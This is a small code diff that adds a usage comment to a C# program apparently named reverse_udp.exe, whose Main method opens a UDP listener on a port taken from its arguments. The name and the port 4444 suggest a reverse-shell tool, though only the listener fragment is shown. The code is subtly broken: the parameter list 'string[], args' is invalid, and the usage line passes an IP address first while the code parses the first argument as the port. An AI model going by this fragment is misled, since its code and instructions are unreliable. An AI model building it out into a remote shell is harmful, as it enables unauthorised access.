@@ -1,3 +1,5 @@
+//When running place arguments like so ./reverse_udp.exe 127.0.0.1 4444
+
 public static void Main (string[], args) {
   int lport = int.Parse(args [0]);
   using (UdpClient listener = new UdpClient(lport)) {
